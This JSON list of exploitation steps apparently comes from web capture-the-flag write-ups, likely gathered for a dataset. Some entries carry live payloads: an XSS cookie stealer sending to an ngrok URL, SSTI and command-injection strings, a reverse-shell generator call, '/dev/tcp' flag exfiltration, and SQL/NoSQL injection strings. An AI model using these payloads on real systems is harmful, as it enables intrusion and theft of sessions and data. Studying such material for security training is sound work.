[
    "Construct a parameter that meets the conditions and requests the flag file",
    "Discover a disallowed route '/fade/to/black'",
    "Inject similar code into the input box",
    "Adjust the value of the secure cookie 'admin' to the desired comparison value 'true'.",
    "Identify that the '$hash' and the '$target' are matched using '==' instead of '==='.",
    "Understand that this makes the match vulnerable to type juggling.",
    "Pass this hash with the GET parameter 'hash' to the server.",
    "Found that the 'flask_caching' module can store a python pickle in redis",
    "Choose the '-vf drawtext=...' option within the 'ffmpeg' command as the method of exploitation.",
    "Formulate the payload in the format 'csictf.gif' -vf drawtext=\\\"text=$(grep ffLaG main.py)\\\"'.gif'.",
    "Perform the action of uploading the gif.",
    "Use the crafted filename for the uploaded gif.",
    "Create 'payload' in the format of a SQL statement",
    "Include 'payload' as the data",
    "Realized it gives the possibility to pass an object in the query statement",
    "Understood that 'password' = 'username' evaluates to 0",
    "Used the exploit to log in",
    "The process includes sending the POST request, extracting the cookie, and getting the flag",
    "Brute force the JWT secret with John The Ripper.",
    "Bypass authentication by making the conditional statement in the SQL query always true due to the SQL Injection.",
    "Recognize that the function for generating a token is using string interpolation to inject variables directly into the token string.",
    "Understand that by adding the necessary characters to the 'username', it is possible to close the double-quote and manipulate the fields following it in the token.",
    "Send the generated webpage to the website.",
    "Send requests with the newly encoded 'Admin' JWT token to attempt user role update and flag access.",
    "Attempt to login using 'user' as both username and password.",
    "Enter the payload 'or 1=1;--' into the 'pass' field to attempt a bypass.",
    "Noticed two javascript files: 'detailsCheck.js' and 'xmlDetailsCheckPayload.js'.",
    "Targeted the /etc/passwd file in the payload.",
    "Captured the flag from the response.",
    "Attempt to upload a valid PHP file.",
    "Identified vulnerability to log4j 2.14.1.",
    "Used a malicious cookie value for exploitation.",
    "Created a test JavaScript file",
    "Executed the payload using the 'unserialize()' function",
    "Included code in the payload to return the flag as the username",
    "Crafted the payload into a representation of a session cookie",
    "Delivered the payload via the crafted session cookie",
    "Fail due to the site removing <script> tags.",
    "Find them in the exploit database.",
    "Set 'host' parameter in URL to '127.0.0.1;cat /etc/passwd'.",
    "Write a payload using the Template Literal method.",
    "Directly call the directory function with 'flag' as its parameter.",
    "Executed the modified command and obtained the flag output from the server.",
    "Recognize the potential JWT exploit (CVE-2016-5431/CVE-2016-10555).",
    "Edit the JWT.",
    "Add the RS256-to-HS256 exploit to the JWT.",
    "Execute the RS256-to-HS256 exploit using python3 jwt_tool.py.",
    "Craft and insert the payload '{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /flag*')\")()}}' into the exploit.",
    "Reinspect the source code with attention to the user authentication process.",
    "Fetch various SQL injection payloads from [swisskyrepo/PayloadsAllTheThings GitHub repository.",
    "Identify a working payload with username `admin' -- ` and any password.",
    "'database.js' lets you add and read items from the database. The query variable control is possible via the website, but SQL injection is unsuccessful.",
    "Input your ngrok URL into the malicious payload. For example, if ngrok URL is 'http://92832de0.ngrok.io', then the payload should be '<script>document.location='http://92832de0.ngrok.io?c='+document.cookie;</script>'",
    "Configure the SQL injection to return all rows in the database.",
    "Retrieve the flag successfully",
    "Determine that template injection is possible",
    "Used the page string as '' and die(show_source('templates/flag.php')) or ''",
    "Identify the vulnerable 'report' admin page",
    "Use a backslash as username",
    "Login as admin using SQL injection",
    "Identified the potential for a JWT key confusion attack.",
    "Understand that a valid signature is needed to exploit RCE",
    "Use the payload to extract flag data from the server.",
    "Extract data from the server.",
    "From the PHP, realize that there\u2019s a potential path traversal vulnerability.",
    "Input 'Accept-Language: ....//....//....//....//flag' in the HTTP header.",
    "Notice that the 'magic code' is present",
    "Observe use of secret flag within a MD5 calculation",
    "Test single characters from '0' to 'f'",
    "Include the caught admin cookies in the request",
    "Observed that clicking on the excerpt button makes an HTTP GET request to '/books.php?type=excerpt&id=1'.",
    "Established the potential presence of an SQL injection vulnerability when the result of the book with 'id=1' printed.",
    "Discovered that a '<flag>' XML element is hidden in the 'books' table but not in the entry with 'id = 1'.",
    "Used a 'UNION' operation for the SQL injection.",
    "Created a malicious URL.",
    "Created a new malicious URL.",
    "Focus on bypassing checks applied to 'warmup' GET parameter.",
    "Implement bitwise XOR operation in PHP to bypass checks.",
    "Ensure the payload commands execution of another GET parameter.",
    "Use 'phpinfo' page to check if the payload is operational.",
    "Second part performs 'file_get_contents('flag.php').",
    "Found that 'POST' and 'PUT' returned a different result.",
    "Included a reference to the /etc/flag.txt directory in the request.",
    "Inject a template operation (7*7)",
    "Discover '?lmao' in the robots.txt file",
    "Discover that 'preg_replace' is vulnerable to RCE (Remote Code Execution) using '/e'",
    "Use the 'fread' and 'fopen' functions to craft a payload to read 'config.php'",
    "Visit 'http://easy-php.darkarmy.xyz/?bruh=base64_encode(fread(fopen($_GET[%27pwn%27],%27r%27),512))&nic3=/DarkCON/e&pwn=config.php'",
    "Execute the crafted payload",
    "Write a new PHP exploit",
    "Create the new PHP exploit",
    "Attempted to alter the User-Agent during authentication.",
    "Implemented an error-based approach.",
    "Point 'xxe' to the required file 'file:///flag.txt'",
    "Website displays the content of the '/flag.txt' file",
    "Find the flag on the accessed page",
    "Identify the URL parameter labelled 'flag'",
    "Bypass the JavaScript check.",
    "Observe that remote shell functionality is blocked due to 'seccomp' filter preventing 'execve'.",
    "Observe that it is accessed only by authenticated users.",
    "Read the created item from the request smuggling.",
    "Crafted a record by setting a password with a ':' character.",
    "Understand that the goal is to exfiltrate the session cookies",
    "Discover the SQL Injection payload from the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,username,null,null,null,null/**/from/**/users'",
    "Prepared an SQL injection using 'UNION' clause to search for 'flagman69' user.",
    "Attempted the SQL injection on the authentication form.",
    "Used the gained information about the 'users' table structure to craft a new SQL injection.",
    "Recognize that the 'with' HTTP GET parameter can be manipulated.",
    "Create PHP payload",
    "Successful bypass of initial server checks",
    "Introduce additional PHP code",
    "Bypass further server checks",
    "Access flag",
    "Research if 'ereg' instruction can be bypassed.",
    "Investigate if injecting a NULL byte can bypass the 'ereg' instruction.",
    "Inject a NULL byte into the final URL.",
    "Receive HTML content suggesting Shellshock vulnerability.",
    "Identify potential for XSS due to unsanitized input field",
    "Include a script to alert the document's cookies in the uploaded LaTeX document",
    "Decide to forge the cookies",
    "Spoof the cookies",
    "Manipulated the IP address parameter in the SQL query.",
    "Created a UNION SQL operation with 'null'.",
    "Modified the PHPSESSIONID cookie in the browser to Maria's session ID.",
    "Alter the JWT's header to change the algorithm to HS256.",
    "Alter the JWT's payload to change the user type to admin.",
    "Insert PHP code into DocumentName",
    "Ensure the inserted PHP code can execute commands remotely",
    "Analyze the query within the source code",
    "Confirm that the observed behavior indicates a Blind SQL Injection vulnerability",
    "Identify that the application is vulnerable to XXE.",
    "Recognize that the 'author' field can be used to execute the attack.",
    "Send a POST request to /feed.php.",
    "Structure the XML code to expose data from the /etc/passwd file.",
    "Design the XML code to expose the flag file from the current working directory.",
    "Use a basic SQL injection payload",
    "Modify the SQL injection query",
    "Aim to steal the VIP user's cookies.",
    "Trigger JavaScript code.",
    "Decide to use the SQL LIKE clause.",
    "Decide to discover each character of the password one at a time.",
    "Send a POST request to the server.",
    "Realize that the endpoint `getimg.php` is vulnerable to Local File Inclusion (LFI), allowing files on the server to be read.",
    "Use the encoded filenames as parameter values for `getimg.php` to test the LFI vulnerability.",
    "Attempt to read a file from the server",
    "Observe the data from the /etc/passwd file in the response",
    "Attempt reading a file from the server using the crafted payload.",
    "Observe that the response contains data from the /etc/passwd file.",
    "Used the SQL injection to enumerate the columns of the flag table.",
    "Exclude the existing private key from the payload.",
    "Force the debugging private key in the payload.",
    "Recognize this as a code injection challenge.",
    "Inferred the challenge was to exploit the `theme` parameter to inject XSS",
    "Received a custom error as a response to the SQL injection.",
    "Identify a potential redis injection flaw in the refresh_session() function.",
    "Notice that the user's sessionID is used in a redis eval() call with a lua script.",
    "Realize that the pickle python object could potentially be exploited for a pickle deserialization vulnerability.",
    "Make a GET request to /login/ to trigger the deserialization.",
    "Confirmed the existence of a directory traversal vulnerability",
    "The vulnerability is present in the POST filename",
    "The objective is to overwrite '.bashrc' file with their payload",
    "Used Burp's repeater to spam 'Go'",
    "Simultaneously wrote a Python script",
    "Download the nginx.conf file successfully.",
    "Find a potential Off-by-Slash bug.",
    "Inject a double quote to break out of the alt tag.",
    "Add a JavaScript event handler for the XSS attack.",
    "The statement indicates that using the sanitized HTML with jQuery's insecure elm.html() method without the SAFE_FOR_JQUERY flag could lead to XSS.",
    "Submit the URL.",
    "Receive the flag.",
    "Identify XML External Entity (XXE) vulnerability when loading SVG files.",
    "Use the PHP /// uri.",
    "Disguise the phar file as a JPEG image.",
    "Injected Carriage Return Line Feed (CRLF) in the username field",
    "Leak data byte-by-byte by hashing it and using as password for new account",
    "Bruteforce password at :7777 to determine the leaked byte",
    "Run brute.py script to output arbitrary SQL queries",
    "Realized that the invalid characters in the payload can bypass the regex validation",
    "Constructed the final payload URL",
    "Sent the request to 'http://18.179.178.246:8003'",
    "Bypassed strip_tags using the PHP bug.",
    "Bot clicking our link gave us the flag.",
    "Compile the modified injection query.",
    "Execute the compiled query.",
    "Retrieve the corresponding IP address",
    "Choose the vulnerable points in the script to perform the injection.",
    "Execute '/bin/sh' with an argument to read the flag file and redirect the output to '/tmp/jizz'.",
    "Identify the vulnerability (CVE-2022-26377).",
    "Craft another request and set the remote_addr to the required fake address.",
    "Capture the response from the server.",
    "Set up a request with malicious cookie data",
    "Bypassed input validation",
    "'src' set to local files",
    "Leaked secret key '19eb794c831f30f099a31b1c095a17d6' from 'config.py'",
    "Inserted the payload into the target site's URL.",
    "Exploit the vulnerability in the 'query_login_attempt' function.",
    "Encode the payload into 'multipart/form-data'.",
    "Use the encoded payload to bypass the WAF 'Skynet'.",
    "Fetch data using the manipulated query.",
    "Uploaded .htaccess file.",
    "Read the file '/etc/passwd'.",
    "Prepared the SQL query to send to File Descriptor (FD) 4, which is the MySQL server.",
    "Understand that the crash of DOMValidator.js will allow the execution of <script>alert('pwned')</script>.",
    "Try the payload: {\"username\": \"admin\", \"password\": {\"$gt\": \"z\"}}",
    "Infer that fetching passwords is possible by comparing password characters to the alphabet in the payload",
    "Find that the password is 'congratsyouwin' via the bruteforcing method.",
    "Identified the challenge as a NoSQL Injection task",
    "In the password field of the JSON body, use NoSQL's $gt operator to bypass password check by typing {\"$gt\": \"a\"}.",
    "Create a manipulated cookie for bypassing session-based authentication.",
    "Recognize the problem could be related to Server-side Template Injection.",
    "Consider ways to apply the Template Injection exploit with the 'setter' and 'getter' properties for 'key'.",
    "Override the prototype using a payload to set a context to the prototype of [object].",
    "Referrer different from 'web-04.v7frkwrfyhsjtbpfcppnu.ctfz.one'",
    "Use a length of '32 bytes' for the payload",
    "Trigger the 'window.open' function with the payload",
    "Set 'window.name' to the long payload",
    "Further reduce the payload character count by poking around and using different functions",
    "Meet the condition in the JavaScript code by running a payload such that it equals 1337",
    "Attempt to add the attacker's email to the admin's shared note.",
    "Identified task to bypass countermeasures.",
    "Hijack the $whoareyou variable.",
    "Directory switching.",
    "Sent the request 'type=/../super_secret_shell.php'.",
    "Created a reverse shell script using only non-alpha chars.",
    "Recognized first flag hidden in angular endpoint /debug/answer restricted by Nginx and application.",
    "Attempted to mutate the element in order to bypass the sanitizer.",
    "Ran a JavaScript snippet to test different elements for vulnerabilities with the DOMPurify sanitizer.",
    "Tested different elements for vulnerabilities with the `<math>` element bypass.",
    "Implemented a trick to bypass `innerText` resetting the prepared CONFIG clobbering in the payload.",
    "Visit the GitHub exploit page 'https://github.com/ambionics/phpggc'",
    "Visit the GitHub exploit page 'https://github.com/ambionics/laravel-exploits'",
    "Specify the URL for the exploit",
    "Recognize a possible chance to test Local File Inclusion (LFI).",
    "Identify the URL 'ip.address/?lang=es.php' as a potential target for LFI.",
    "Recognize the use of repeated directory traversal sequences in payload modification.",
    "Observe the result of the exploit leading to '/etc/passwd'.",
    "Investigate potential for NoSQL injection due to use of MongoDB.",
    "Inspect the response better.",
    "Attempt authentication bypass with advanced payloads.",
    "Identify that 'eval' is used on data from the POST request.",
    "Replace one of the RGB values in the 'background' parameter.",
    "Conducted further research on 'nunjucks'.",
    "Capture the login request.",
    "Identified a potential vulnerability.",
    "Noted that the 'shell_exec' function may be unsanitized.",
    "Suggested that unsanitized 'shell_exec' function allows for potential shell command exploits.",
    "Attempted to escape the 'shell_exec' function.",
    "Attempted to run shell commands.",
    "Able to run shell commands.",
    "Read the flag.",
    "Identified missing file escape for characters on the filename.",
    "Utilized path traversal to access /etc/passwd file.",
    "Enter an apostrophe in the username field.",
    "Enter an apostrophe in the password field.",
    "Bruteforce the flag character by character.",
    "Use the SUBSTRING and SLEEP functions for each character.",
    "Replace the username with 'admin'.",
    "Understand the need to 'steal' an admin cookie and gain admin access.",
    "Craft a JavaScript snippet that sends a GET request to the '/profile/follow' endpoint.",
    "Execute the JS script silently when admin opens the page.",
    "Attempt to guess admin's subdomain.",
    "Access the desired file using the exploited vulnerabilities.",
    "Realize the cause of stability issues is multiple users attacking simultaneously with sqlmap",
    "Discover a method to bypass the character limit issue",
    "Use Burp Suite to pass the password despite the character limit",
    "Recognize an alternative method to bypass the login via the username field",
    "Fail to recognize the potential for using an SQL injection into the password field as an authentication bypass",
    "Used directory traversal (../) to access the flag",
    "Aim to access internal files",
    "Identified that the system might be susceptible to an XXE (XML External Entity) attack.",
    "The XML payload was designed to extract information from /var/www.",
    "Leverage the assumption that the word 'launch' could be a keyword.",
    "Attempted SQL login bypass",
    "Attempt different passwords",
    "Set the loop condition to run until the password is fully determined using the SQL Injection.",
    "Use a wildcard pattern and append the current character to check if the password starts with the current guessed string.",
    "Send a POST request.",
    "Change the hashed value in the session_id cookie to correspond to the username 'admin'.",
    "Minify the code to be read as XSS.",
    "Identify a SQL injection vulnerability in the 'data-server' project.",
    "Execute commands using the SSTI vulnerability to read directory contents.",
    "Check if 'True' is present in the response.",
    "If 'True' is present, append the flag string character to the flag.",
    "Identify SQL injection vulnerability",
    "Add comments to comment out the rest of the query",
    "Check if the response text contains 'LITCTF{' to identify a CTF flag.",
    "Recognized that file path in 'export_db' function could be manipulated for path traversal.",
    "Performed a POST request to the /api.php endpoint with 'id', 'pw', 'c', 'c2', 'pas', and 'db' parameters, using path traversal to access the flag.",
    "Realize the need to request 'http://genflag/flag'.",
    "Use path traversal to get the SSH key.",
    "Get the SSH key to the attacker site.",
    "Injected a command that echoes the FLAG environment variable",
    "Redirect the browser using the `Location` header.",
    "Set the 'language' parameter to 'flag.txt' in the payload.",
    "Determine a method to bypass Jinja2 SSTI filters",
    "Execute 'ls' command on the server using `subprocess.Popen`",
    "Obtain the flag",
    "Understand that 'notes.count' applies a filter.",
    "Understand that 'notes.count' returns the count of notes that pass the filter.",
    "Recognize the use of wildcards in tar utility.",
    "Understand the need to overcome file extension restrictions.",
    "Create the file '--checkpoint=1'.",
    "Dig into tar documentation to find alternatives.",
    "Upload enough bytes to exceed 10 records.",
    "Cause the checkpoint action to be executed by exceeding 10 records.",
    "Send a GET request to '/download_all' to trigger the exploit.",
    "Execution of the tar command with wildcard arguments causes the payload in 'shell.txt' to be executed.",
    "Successfully obtain a reverse shell.",
    "Bypass double URL decoding by server.",
    "Identified possibility to use 'Parameter Pollution' by having two 'amount' arguments.",
    "Added a special character (') to the end of the username.",
    "Appended a payload to the back of the signup date.",
    "Ran SQLMap with the script.",
    "Experimented with `1' ORDER BY` commands.",
    "Determined that SELECT and UNION keywords were being filtered by regex.",
    "Recognized the need to manipulate the PATH variable to execute arbitrary code when 'id' is called",
    "Understood the goal to read the 'flag.txt' file that requires root access",
    "Created an 'id' file with the malicious payload",
    "Identify '/cmd.php' endpoint.",
    "Observe the existence of a blacklist filter.",
    "Identify the use of base64-encoded payloads.",
    "Include the base64-encoded payload in the command.",
    "Identify a web application vulnerability, specifically XS Leaks.",
    "Objective is to dump the database and retrieve the flag",
    "User's cookies are sent along with the POST request",
    "Payload catches and sends the response, containing the admin's hash, to an exploit server",
    "When the admin's hash is used, the /api/create handler does not sanitize data",
    "Inject a Set-Cookie header to set the admin's ID cookie to your own session.",
    "Ensure the XSS payload fits within the 75 character limit.",
    "Use JavaScript code using `document.cookie` to control variables in the payload.",
    "Set malicious cookies.",
    "The malicious JavaScript code is executed on the client's side.",
    "Identify the need to overwrite the <userID>_isAdmin value.",
    "Recognize the presence of a Local File Inclusion vulnerability on '/post.php'.",
    "Identify the capability of setting the 'theme' value in the session using the 'theme' GET query parameter.",
    "Identified a line of code where user input is passed unfiltered.",
    "Injected a UNION query.",
    "Extracted the flag from the identified table.",
    "Inserted a series of directory traversal characters (/%2e%2e/%2e%2e) in the request to access server root directories",
    "Recognized vulnerability as a request smuggling vulnerability.",
    "Identified the usage of 'Content-Length' header with 'Transfer-Encoding' header as a request smuggling vulnerability.",
    "Included the 'Content-Length' header in the payload.",
    "Included the 'Transfer-Encoding' header in the payload.",
    "Assume that the input fields are not properly sanitizing special characters.",
    "Bypass the login function successfully due to successful SQL injection.",
    "Name the cookie 'authenticated-user'.",
    "Assign the value 'true' to the cookie.",
    "Choose to make an internal request.",
    "Include the '/gallery?galleryUrl=' query parameter.",
    "Specify 'http://localhost:20011/admin' as the value for the 'galleryUrl' parameter.",
    "Discover that the app uses curl for certain inputs.",
    "Spaces aren't allowed.",
    "' AND password=' is treated as a string and hence, ignored",
    "Executed SQL statement: SELECT username, password FROM users WHERE username='adm' || trim('in',' AND password=') || ''",
    "The XML part substitutes an entity 'myExternalEntity' with '/etc/passwd', hinting at XXE exploitation.",
    "Received a list of users as a response.",
    "Confirmed the XXE vulnerability.",
    "Ran PHP code while XML parsing is performed.",
    "Bypassed 'disable_functions' on PHP 7.0-8.0 versions.",
    "Gained shell remote code execution.",
    "Identified an SQL injection vulnerability.",
    "Used the payload 'username=test&password=test' or 1=1 LIMIT 1;#'.",
    "Investigated users.php page.",
    "Identified possible injection vectors.",
    "Attempted to replace 'card_num' with 'R34L_F14G' in SQLMAP query.",
    "Identify the 'eval()' vulnerability",
    "Reference the blocked function and restricted file",
    "Set the GET parameter to '?print=echo+'';print(eval('return ${blocked}[4](${nc});'))'",
    "Note that it executes file_get_contents('../flag.txt')",
    "Realized that the search function checks if a given fragment identifier substring is part of the flag.",
    "The script loads a template including the query for each possible character.",
    "Choose a .phtml file for upload.",
    "Allowed access to the `/flag` endpoint.",
    "Understand that the reverse shell payload will be fired when the data is deserialized.",
    "Use the command 'python nodejsshell.py 2.tcp.ngrok.io 13755' to generate a reverse shell payload for the ngrok tunnel.",
    "Establish a reverse shell.",
    "Leveraged the prototype pollution to run 'require('./usage')'.",
    "Controlled 'pkg' by polluting '__proto__.data'.",
    "Controlled 'pkgPath' by polluting '__proto__.path'.",
    "Understood that to reach this code path, 'npm_config_global' needs to be polluted.",
    "Polluted 'npm_config_global' to a truthy value.",
    "Discover that if a zip file with 'docker-entry' in its name is uploaded.",
    "The program will execute the script within a docker container with greater access (runs as `uploaded` user).",
    "As opposed to executing normally (runs as `nobody` user).",
    "Note that the Traefik service only accepts the POST, GET, OPTIONS, DELETE and PATCH methods",
    "Note that the Python microservice allows the running of arbitrary commands when the GET method is used",
    "Find a way of issuing a pseudo PUT request by using a POST request with a '_method' query parameter set to PUT",
    "Understand that this trick helps continue the search from the previously found index onwards and it can allow multiple instances of 'fqdn'.",
    "Find a way around the restrictive regex check.",
    "Exfiltrate the contents of the 'flag' file in the POST request.",
    "Observe the page indicating SQL Injection attacks are blocked.",
    "Write an SQLMap tamper script.",
    "Prepend 'a' characters to the payload.",
    "Included a 'uri' parameter with a malformed path, such as //ATTACKER-URL, in the request.",
    "Identify that /sakura allows interaction with the Redis cache.",
    "Observed restrictions on certain characters and strings.",
    "Noted restrictions on space, 'AND', 'OR', etc.",
    "Constructed a PHP redirect to access 'localhost:8081/flag'.",
    "Noted that the `ApiMapper` makes a GET request.",
    "Realize that this allows us to bypass the JavaScript's check.",
    "Replace the string 'alert(1)' with the converted string of our JavaScript payload.",
    "Exploiting the fact that the token for id=0 is the same every time.",
    "Exfiltrate the data to 'http://ATTACKER_URL'.",
    "Append payload to '/readflag' command in 'f' GET parameter.",
    "Identified the possibility of XSS in a user's profile.",
    "Ruled out mutation XSS attacks on these libraries as 'marked' does not sanitize output HTML.",
    "Crafted a URL that appended an HTML header tag to the domain part of the email parameter, thereby exploiting the lax character restriction.",
    "Tested the SSTI vulnerability by crafting a URL that performed simple arithmetic in the email parameter using Jinja2 template syntax.",
    "Leaked the contents of the admin page",
    "Identify XSS vulnerability in the feedback feature of the site.",
    "Use the generated 2FA code for another CSRF attack.",
    "Exfiltrated each character using the updated CSS.",
    "Work on bypassing '{{' by using an if-else statement.",
    "Work on bypassing '}}' by using an if-else statement.",
    "Bypass '_' by constructing a string",
    "Bypass '\\' by constructing a string",
    "Bypass 'class' by constructing a string",
    "Bypass 'subclasses' by constructing a string",
    "Bypass 'getitem' by constructing a string",
    "Identified the specific version (2.4.0) of HAProxy.",
    "Included an overflowing 'Content-Length' header.",
    "Obtained the flag in the response of the smuggled request.",
    "Submit the 'modified.odt' file with the payload to the server as a file upload.",
    "Utilized script to make the client request.",
    "Configured the PHP script to redirect to itself 19 times.",
    "Explored different methods for conducting XSS attacks on XSL documents.",
    "Notice 'require()' leads to a Local File Inclusion (LFI) vulnerability.",
    "Pollute '__proto__' attribute with a command injection payload in the 'data'.",
    "Specify 'changelog.js' script in the path of the JSON payload.",
    "Gained a reverse shell by invoking the Lambda function",
    "Use this behaviour when constructing SQL queries to bypass the login.",
    "Bypass the access control implemented on ATS.",
    "Recognise potential exploit",
    "HTTP POST request to sell flag with negative price",
    "Enable CORS to execute arbitrary JavaScript through the hosted file.",
    "Identified that the OTP code was validated using SQL 'LIKE' operator.",
    "Exploited parser differential in BeautifulSoup.",
    "Triggered a JSONP response from the YouTube API.",
    "Created a callback that reflected the response into Javascript code.",
    "Submitted final payload that contained a script.",
    "Repeated the Javascript injection to fetch the flag.",
    "Derive a proof-of-concept (PoC) to brute-force a character of the flag by exploiting the observed behavior",
    "Discover an edge case where not closing a BBCode tag results in an unencoded content being reflected",
    "Send the flag to an external server using the '/readflag>/dev/tcp' command",
    "Identify prototype pollution vulnerability",
    "Identify off-by-one error in `background.js` font validation",
    "Manipulate `utils.FONTS[10]` using the off-by-one error",
    "Ensure the injected `style` element is readable by the attacker",
    "Craft a request to smuggle a request to /admin in flagportal.",
    "Caught the request including the Admin-Key on our own server.",
    "Use the known hash of an empty string as a token value for authentication.",
    "Discover RCE vulnerability through pre-installed 'pearcmd.php'.",
    "Initialized a server to exploit the above vulnerability.",
    "Programmed the server to redirect to 'http://localhost/flag' in the second response.",
    "Execute Prototype pollution attack.",
    "Leverage the navigation function and the XS leak.",
    "Use '?length=' as the query string.",
    "Determined that the address of the XSS payload can be predicted.",
    "Noticed that the `name` is written to memory regardless of XSS check.",
    "Identified the possibility of 'inserting' and overwriting the XSS payload in the `HEAD->name`.",
    "Realized that `getNameAtIndex(0)` will return the XSS payload when displaying the table."
]